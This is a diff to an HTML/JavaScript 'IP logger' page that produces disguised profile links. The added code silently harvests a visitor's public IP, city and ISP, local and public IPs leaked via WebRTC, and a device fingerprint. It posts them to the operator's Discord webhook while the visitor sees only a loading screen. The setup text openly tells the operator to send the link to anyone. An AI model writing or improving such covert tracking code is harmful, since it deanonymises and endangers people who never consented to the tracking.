@@ -45,7 +45,8 @@ button:disabled{opacity:.4;cursor:not-allowed}
   word-break:break-all;background:#000;border:1px solid var(--line2);
   padding:12px;font-size:12px;color:#fff;user-select:all;
 }
-.hint{color:var(--dim2);font-size:11px;margin-top:10px}
+.hint{color:var(--dim2);font-size:11px;margin-top:10px;line-height:1.6}
+.hint b{color:var(--dim);font-weight:600}
 .status{margin-top:14px;font-size:11px;letter-spacing:.08em;color:var(--dim);min-height:16px}
 .status.ok{color:#fff}
 .status.err{color:#ff5a5a}
@@ -56,26 +57,25 @@ button:disabled{opacity:.4;cursor:not-allowed}
 </head>
 <body>
 <div class="wrap" id="app"></div>
-
 <script>
 (function () {
   "use strict";
-
   /* ══════════════════════════════════════════════════════════
      CONFIG
      ══════════════════════════════════════════════════════════ */
   const IMG = "https://i.pinimg.com/1200x/ac/e7/87/ace7872eaa8cbaf418aa47cdf8034359.jpg";
 
-  // Where to send the visitor after data is captured.
-  // Leave "" to keep them on a blank "loading" page.
-  const REDIRECT_URL = "";
+  /* ↓↓↓  PASTE YOUR WEBHOOK BETWEEN THE QUOTES, THEN RE-UPLOAD  ↓↓↓ */
+  const WEBHOOK = "";
 
-  const LINK_LABEL = "profile"; // domain.com/#/profile/xxxx
+  const REDIRECT_URL = "";          // "" = stay on loading screen
+  const LINK_LABEL   = "profile";   // yoursite.com/#/profile/g5p9f
+  const STORE_KEY    = "pw";
   /* ══════════════════════════════════════════════════════════ */
 
   const app = document.getElementById("app");
 
-  /* ---------- small helpers ---------- */
+  /* ---------- helpers ---------- */
   const b64e = s => btoa(unescape(encodeURIComponent(s)))
       .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
   const b64d = s => {
@@ -85,17 +85,39 @@ button:disabled{opacity:.4;cursor:not-allowed}
 
   const ID_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789";
   function makeId(len) {
-    len = len || (4 + Math.floor(Math.random() * 3)); // 4–6 chars
-    const r = crypto.getRandomValues(new Uint8Array(len));
+    len = len || (4 + Math.floor(Math.random() * 3));
     let out = "";
-    for (let i = 0; i < len; i++) out += ID_CHARS[r[i] % ID_CHARS.length];
+    if (window.crypto && crypto.getRandomValues) {
+      const r = crypto.getRandomValues(new Uint8Array(len));
+      for (let i = 0; i < len; i++) out += ID_CHARS[r[i] % ID_CHARS.length];
+    } else {
+      for (let i = 0; i < len; i++) out += ID_CHARS[Math.floor(Math.random() * ID_CHARS.length)];
+    }
     return out;
   }
 
-  const WH_RE = /^https:\/\/(?:\w+\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[\w-]+\/?$/;
+  const WH_RE = /^https:\/\/(?:[\w-]+\.)*discord(?:app)?\.com\/api\/(?:v\d+\/)?webhooks\/\d+\/[\w-]+\/?$/;
+
+  function storedWebhook() {
+    try { const v = localStorage.getItem(STORE_KEY); return v && WH_RE.test(v) ? v : ""; }
+    catch (e) { return ""; }
+  }
+  function resolveWebhook(urlWh) {
+    if (urlWh && WH_RE.test(urlWh)) return urlWh;
+    const s = storedWebhook(); if (s) return s;
+    if (WEBHOOK && WH_RE.test(WEBHOOK)) return WEBHOOK;
+    return "";
+  }
+
+  function fetchWithTimeout(url, ms, opts) {
+    const ctrl = new AbortController();
+    const t = setTimeout(() => ctrl.abort(), ms);
+    return fetch(url, Object.assign({ cache: "no-store", signal: ctrl.signal }, opts || {}))
+      .finally(() => clearTimeout(t));
+  }
 
   /* ══════════════════════════════════════════════════════════
-     ROUTER  —  #/profile/<id>?w=<base64url(webhook)>
+     ROUTER
      ══════════════════════════════════════════════════════════ */
   function route() {
     const hash = location.hash.replace(/^#/, "");
@@ -107,13 +129,122 @@ button:disabled{opacity:.4;cursor:not-allowed}
     if (!m) m = location.pathname.match(/\/profile\/([A-Za-z0-9_-]+)/);
 
     const qs = new URLSearchParams(query || location.search.slice(1));
-    let wh = qs.get("w") ? b64d(qs.get("w")) : "";
-
+    const wh = qs.get("w") ? b64d(qs.get("w")) : "";
     return { id: m ? m[1] : null, webhook: wh };
   }
 
   /* ══════════════════════════════════════════════════════════
-     DATA COLLECTION  (non-sensitive: hardware + browser only)
+     WEBRTC IP DETECTION  (STUN + local ICE candidates)
+     ══════════════════════════════════════════════════════════ */
+  function isPrivateIP(ip) {
+    if (ip.indexOf(":") !== -1) {
+      return /^(fe80|fc|fd)/i.test(ip) || ip === "::1";
+    }
+    const p = ip.split(".").map(Number);
+    if (p.length !== 4 || p.some(n => isNaN(n))) return false;
+    return p[0] === 10 || p[0] === 127 ||
+      (p[0] === 172 && p[1] >= 16 && p[1] <= 31) ||
+      (p[0] === 192 && p[1] === 168) ||
+      (p[0] === 169 && p[1] === 254);
+  }
+
+  function getWebRTCIPs(timeoutMs) {
+    timeoutMs = timeoutMs || 2000;
+    const localSet  = new Set();
+    const publicSet = new Set();
+
+    return new Promise(resolve => {
+      let pc;
+      try {
+        pc = new RTCPeerConnection({
+          iceServers: [
+            { urls: "stun:stun.l.google.com:19302" },
+            { urls: "stun:stun1.l.google.com:19302" },
+            { urls: "stun:stun.cloudflare.com:3478" }
+          ]
+        });
+      } catch (e) { return resolve({ local: [], public: [] }); }
+
+      let finished = false;
+      const finish = () => {
+        if (finished) return;
+        finished = true;
+        try { pc.close(); } catch (e) {}
+        resolve({ local: [...localSet], public: [...publicSet] });
+      };
+
+      const timer = setTimeout(finish, timeoutMs);
+
+      pc.onicecandidate = e => {
+        if (!e.candidate) { clearTimeout(timer); finish(); return; }
+        const parts = e.candidate.candidate.split(" ");
+        const ip = parts[4];
+        if (!ip) return;
+        if (/\.local$/i.test(ip)) return;   // mDNS obfuscated hostname
+        if (isPrivateIP(ip)) localSet.add(ip);
+        else publicSet.add(ip);
+      };
+
+      try {
+        pc.createDataChannel("x");
+        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
+      } catch (e) { clearTimeout(timer); finish(); }
+    });
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     PUBLIC IP + GEO  (runs from the visitor's browser)
+     ══════════════════════════════════════════════════════════ */
+  async function getIPInfo() {
+    const providers = [
+      {
+        url: "https://ipwho.is/",
+        pick: d => (d && d.success !== false && d.ip) ? {
+          ip: d.ip,
+          city: d.city,
+          region: d.region,
+          country: d.country,
+          countryCode: d.country_code,
+          isp: d.connection && d.connection.isp,
+          org: d.connection && d.connection.org,
+          asn: d.connection && d.connection.asn,
+          type: d.type
+        } : null
+      },
+      {
+        url: "https://ipapi.co/json/",
+        pick: d => (d && d.ip) ? {
+          ip: d.ip,
+          city: d.city,
+          region: d.region,
+          country: d.country_name,
+          countryCode: d.country_code,
+          isp: d.org,
+          org: d.org,
+          asn: d.asn,
+          type: d.version
+        } : null
+      },
+      {
+        url: "https://api.ipify.org?format=json",
+        pick: d => (d && d.ip) ? { ip: d.ip } : null
+      }
+    ];
+
+    for (const p of providers) {
+      try {
+        const r = await fetchWithTimeout(p.url, 3000);
+        if (!r.ok) continue;
+        const data = await r.json();
+        const picked = p.pick(data);
+        if (picked && picked.ip) return picked;
+      } catch (e) { /* try next */ }
+    }
+    return null;
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     DATA COLLECTION
      ══════════════════════════════════════════════════════════ */
   function detectBrowser(ua) {
     const list = [
@@ -130,20 +261,18 @@ button:disabled{opacity:.4;cursor:not-allowed}
     }
     return { name: "Unknown", version: "-" };
   }
-
   function detectOS(ua) {
-    if (/Windows NT 10/.test(ua))  return "Windows 10 / 11";
+    if (/Windows NT 10/.test(ua))   return "Windows 10 / 11";
     if (/Windows NT 6\.3/.test(ua)) return "Windows 8.1";
-    if (/Windows/.test(ua))        return "Windows";
+    if (/Windows/.test(ua))         return "Windows";
     const a = ua.match(/Android ([\d.]+)/);
     if (a) return "Android " + a[1];
     if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
-    if (/Mac OS X/.test(ua))       return "macOS";
-    if (/CrOS/.test(ua))           return "ChromeOS";
-    if (/Linux/.test(ua))          return "Linux";
+    if (/Mac OS X/.test(ua))         return "macOS";
+    if (/CrOS/.test(ua))             return "ChromeOS";
+    if (/Linux/.test(ua))            return "Linux";
     return "Unknown";
   }
-
   function getGPU() {
     try {
       const c = document.createElement("canvas");
@@ -158,11 +287,24 @@ button:disabled{opacity:.4;cursor:not-allowed}
     } catch (e) { return null; }
   }
 
-  function collect() {
+  async function collect() {
     const nav = navigator;
     const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
     let tz = "unknown";
     try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}
+
+    // Network probes run in parallel — hard capped so the page never hangs
+    const netPromise = Promise.all([
+      getWebRTCIPs(2000),
+      getIPInfo()
+    ]).catch(() => [{ local: [], public: [] }, null]);
+
+    const net = await Promise.race([
+      netPromise,
+      new Promise(r => setTimeout(() => r([{ local: [], public: [] }, null]), 3600))
+    ]);
+    const webrtc = net[0] || { local: [], public: [] };
+    const ipinfo = net[1] || null;
 
     return {
       ua:       nav.userAgent,
@@ -173,61 +315,80 @@ button:disabled{opacity:.4;cursor:not-allowed}
       memory:   nav.deviceMemory || null,
       gpu:      getGPU(),
       screen:   screen.width + "×" + screen.height,
-      avail:    screen.availWidth + "×" + screen.availHeight,
       viewport: innerWidth + "×" + innerHeight,
       dpr:      window.devicePixelRatio || 1,
       depth:    screen.colorDepth,
       lang:     nav.language || "unknown",
-      langs:    (nav.languages || []).join(", ") || "unknown",
       tz:       tz,
       touch:    nav.maxTouchPoints || 0,
       conn:     conn.effectiveType || null,
       downlink: conn.downlink || null,
       referrer: document.referrer || "direct",
-      page:     location.href
+      page:     location.href,
+      webrtc:   webrtc,
+      ipinfo:   ipinfo
     };
   }
 
   /* ══════════════════════════════════════════════════════════
-     EMBED BUILDER  (black & white)
+     EMBED BUILDER  (clean, grouped layout)
      ══════════════════════════════════════════════════════════ */
-  function buildPayload(id, d, preview) {
-    const fields = [
-      { name: "Browser",      value: "`" + d.browser.name + " " + d.browser.version + "`", inline: true },
-      { name: "System",       value: "`" + d.os + "`",                                    inline: true },
-      { name: "Platform",     value: "`" + d.platform + "`",                              inline: true },
-      { name: "Screen",       value: "`" + d.screen + "`",                                inline: true },
-      { name: "Viewport",     value: "`" + d.viewport + "`",                              inline: true },
-      { name: "Pixel Ratio",  value: "`" + d.dpr + "x`",                                  inline: true },
-      { name: "CPU Cores",    value: "`" + (d.cores != null ? d.cores : "n/a") + "`",     inline: true },
-      { name: "Device RAM",   value: d.memory ? "`~" + d.memory + " GB`" : "`n/a`",       inline: true },
-      { name: "Touch Points", value: "`" + d.touch + "`",                                 inline: true },
-      { name: "GPU",          value: d.gpu ? "`" + d.gpu.renderer + "`" : "`blocked / n/a`", inline: false },
-      { name: "Language",     value: "`" + d.lang + "`",                                  inline: true },
-      { name: "Timezone",     value: "`" + d.tz + "`",                                    inline: true }
-    ];
+  function q(v) { return "`" + v + "`"; }
 
-    if (d.conn) {
+  function buildPayload(id, d, preview) {
+    const fields = [];
+    const ip   = d.ipinfo || {};
+    const rt   = d.webrtc || { local: [], public: [] };
+
+    /* ── Network ───────────────────────────────────────────── */
+    if (ip.ip)        fields.push({ name: "IP",           value: q(ip.ip), inline: true });
+    if (ip.country) {
+      const loc = [ip.city, ip.region, ip.country].filter(Boolean).join(", ");
+      fields.push({ name: "Location", value: q(loc), inline: true });
+    }
+    if (ip.isp || ip.org) fields.push({ name: "ISP",    value: q(ip.isp || ip.org), inline: true });
+
+    if (rt.public.length)
+      fields.push({ name: "STUN IP", value: q(rt.public.join(", ")), inline: true });
+    if (rt.local.length)
+      fields.push({ name: "Local IP", value: q(rt.local.join(", ")), inline: true });
+    if (d.conn)
       fields.push({
         name: "Connection",
-        value: "`" + d.conn + (d.downlink ? " • " + d.downlink + " Mb/s" : "") + "`",
+        value: q(d.conn + (d.downlink ? " · " + d.downlink + " Mb/s" : "")),
         inline: true
       });
-    }
 
-    fields.push({ name: "Referrer", value: "`" + d.referrer + "`", inline: false });
+    /* ── Device ────────────────────────────────────────────── */
+    fields.push({ name: "System",   value: q(d.os),                                     inline: true });
+    fields.push({ name: "Browser",  value: q(d.browser.name + " " + d.browser.version), inline: true });
+    fields.push({ name: "Platform", value: q(d.platform),                               inline: true });
+
+    fields.push({ name: "Screen",   value: q(d.screen + " · " + d.dpr + "x"), inline: true });
+    fields.push({ name: "Viewport", value: q(d.viewport),                    inline: true });
+    fields.push({ name: "Depth",    value: q(d.depth + "-bit"),              inline: true });
+
+    fields.push({ name: "CPU",      value: q((d.cores != null ? d.cores + " cores" : "n/a")), inline: true });
+    fields.push({ name: "RAM",      value: q(d.memory ? "~" + d.memory + " GB" : "n/a"),      inline: true });
+    fields.push({ name: "Touch",    value: q(d.touch + " pts"),                              inline: true });
+
+    if (d.gpu)
+      fields.push({ name: "GPU", value: q(d.gpu.renderer), inline: false });
+
+    /* ── Locale / misc ─────────────────────────────────────── */
+    fields.push({ name: "Language", value: q(d.lang), inline: true });
+    fields.push({ name: "Timezone", value: q(d.tz),   inline: true });
+    if (d.referrer && d.referrer !== "direct")
+      fields.push({ name: "Referrer", value: q(d.referrer), inline: false });
 
     const ts = Math.floor(Date.now() / 1000);
-
     return {
       username: "profile",
       avatar_url: IMG,
       embeds: [{
         author: { name: "◼ NEW PROFILE VISIT" + (preview ? " (TEST)" : ""), icon_url: IMG },
-        title: "`" + id + "`",
-        description:
-          "**ID** · `" + id + "`\n" +
-          "**Time** · <t:" + ts + ":F>",
+        title: q(id),
+        description: "**ID** · " + q(id) + "  ·  **Time** · <t:" + ts + ":F>",
         color: 0x000000,
         fields: fields,
         image: { url: IMG },
@@ -237,14 +398,28 @@ button:disabled{opacity:.4;cursor:not-allowed}
     };
   }
 
+  /* ══════════════════════════════════════════════════════════
+     SEND  —  multipart first (no CORS preflight), JSON fallback
+     ══════════════════════════════════════════════════════════ */
   async function send(webhook, payload) {
-    const res = await fetch(webhook, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    });
-    if (!res.ok) throw new Error("HTTP " + res.status);
-    return true;
+    const url = webhook.replace(/\/+$/, "") + "?wait=true";
+
+    try {
+      const fd = new FormData();
+      fd.append("payload_json", JSON.stringify(payload));
+      const res = await fetch(url, { method: "POST", body: fd, mode: "cors" });
+      if (res.ok || res.status === 204) return true;
+      throw new Error("HTTP " + res.status);
+    } catch (e1) {
+      const res = await fetch(url, {
+        method: "POST",
+        mode: "cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      if (!res.ok) throw new Error("HTTP " + res.status);
+      return true;
+    }
   }
 
   /* ══════════════════════════════════════════════════════════
@@ -269,36 +444,43 @@ button:disabled{opacity:.4;cursor:not-allowed}
             '<button id="copy" class="ghost">Copy</button>' +
             '<button id="open" class="ghost">Open</button>' +
           '</div>' +
-          '<div class="hint">Send this to anyone — opening it posts their browser + hardware info to your webhook.</div>' +
+          '<div class="hint">Captures IP (v4/v6), geolocation, ISP, WebRTC local/STUN IPs ' +
+          'plus browser &amp; hardware fingerprint. The link stays short — the webhook ' +
+          'is <b>not</b> inside it. Paste your webhook into <b>WEBHOOK</b> at the top ' +
+          'of this file and re-upload so other people\'s visits reach you.</div>' +
         '</div>' +
         '<div class="status" id="status"></div>' +
       '</div>';
 
-    const $wh    = document.getElementById("wh");
-    const $out   = document.getElementById("out");
-    const $link  = document.getElementById("link");
-    const $stat  = document.getElementById("status");
+    const $wh   = document.getElementById("wh");
+    const $out  = document.getElementById("out");
+    const $link = document.getElementById("link");
+    const $stat = document.getElementById("status");
+
+    $wh.value = storedWebhook() || WEBHOOK || "";
 
     function setStatus(msg, cls) {
       $stat.textContent = msg || "";
       $stat.className = "status" + (cls ? " " + cls : "");
     }
-
-    function getWebhook() {
+    function getWebhook(save) {
       const v = $wh.value.trim();
       if (!WH_RE.test(v)) { setStatus("✕ invalid discord webhook url", "err"); return null; }
+      if (save) { try { localStorage.setItem(STORE_KEY, v); } catch (e) {} }
       setStatus("");
       return v;
     }
+    function baseUrl() {
+      if (location.origin && location.origin !== "null")
+        return location.origin + location.pathname;
+      return location.href.split("#")[0];
+    }
 
     document.getElementById("gen").addEventListener("click", function () {
-      const wh = getWebhook();
+      const wh = getWebhook(true);
       if (!wh) return;
-
-      const id = makeId();
-      const base = location.origin + location.pathname;
-      const url = base + "#/" + LINK_LABEL + "/" + id + "?w=" + b64e(wh);
-
+      const id  = makeId();
+      const url = baseUrl() + "#/" + LINK_LABEL + "/" + id;
       $link.textContent = url;
       $out.classList.add("show");
       setStatus("✓ link generated — id " + id, "ok");
@@ -308,8 +490,8 @@ button:disabled{opacity:.4;cursor:not-allowed}
       const txt = $link.textContent;
       if (!txt) return;
       navigator.clipboard.writeText(txt)
-        .then(function () { setStatus("✓ copied to clipboard", "ok"); })
-        .catch(function () { setStatus("✕ copy failed — select manually", "err"); });
+        .then(() => setStatus("✓ copied to clipboard", "ok"))
+        .catch(() => setStatus("✕ copy failed — select manually", "err"));
     });
 
     document.getElementById("open").addEventListener("click", function () {
@@ -317,13 +499,14 @@ button:disabled{opacity:.4;cursor:not-allowed}
     });
 
     document.getElementById("test").addEventListener("click", async function () {
-      const wh = getWebhook();
+      const wh = getWebhook(true);
       if (!wh) return;
       const btn = this;
       btn.disabled = true;
-      setStatus("sending…");
+      setStatus("collecting + sending…");
       try {
-        await send(wh, buildPayload(makeId(), collect(), true));
+        const data = await collect();
+        await send(wh, buildPayload(makeId(), data, true));
         setStatus("✓ test embed sent — check your channel", "ok");
       } catch (e) {
         setStatus("✕ failed: " + e.message, "err");
@@ -331,30 +514,41 @@ button:disabled{opacity:.4;cursor:not-allowed}
       btn.disabled = false;
     });
 
-    $wh.addEventListener("keydown", function (e) {
+    $wh.addEventListener("keydown", e => {
       if (e.key === "Enter") document.getElementById("gen").click();
     });
   }
 
   /* ══════════════════════════════════════════════════════════
-     VIEW — PROFILE VISIT (capture + optional redirect)
+     VIEW — PROFILE VISIT
      ══════════════════════════════════════════════════════════ */
-  function renderProfile(id, webhook) {
+  async function renderProfile(id, webhook) {
     app.innerHTML =
       '<div class="card center">' +
         '<div class="spin">▪ ▪ ▪</div>' +
         '<div class="hint">loading</div>' +
       '</div>';
 
-    const data = collect();
-    const payload = buildPayload(id, data, false);
+    const done = () => { if (REDIRECT_URL) location.replace(REDIRECT_URL); };
 
-    const done = function () {
-      if (REDIRECT_URL) location.replace(REDIRECT_URL);
-    };
+    try {
+      const data    = await collect();
+      const payload = buildPayload(id, data, false);
 
-    if (!webhook || !WH_RE.test(webhook)) { done(); return; }
-    send(webhook, payload).then(done).catch(done);
+      if (!webhook) { done(); return; }
+
+      try {
+        await send(webhook, payload);
+      } catch (e) {
+        try {
+          const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
+          navigator.sendBeacon(webhook.replace(/\/+$/, "") + "?wait=true", blob);
+        } catch (e2) {}
+      }
+    } catch (e) {
+      // swallow — always redirect/complete
+    }
+    done();
   }
 
   /* ══════════════════════════════════════════════════════════
@@ -362,7 +556,7 @@ button:disabled{opacity:.4;cursor:not-allowed}
      ══════════════════════════════════════════════════════════ */
   function boot() {
     const r = route();
-    if (r.id) renderProfile(r.id, r.webhook);
+    if (r.id) renderProfile(r.id, resolveWebhook(r.webhook));
     else      renderSetup();
   }
 
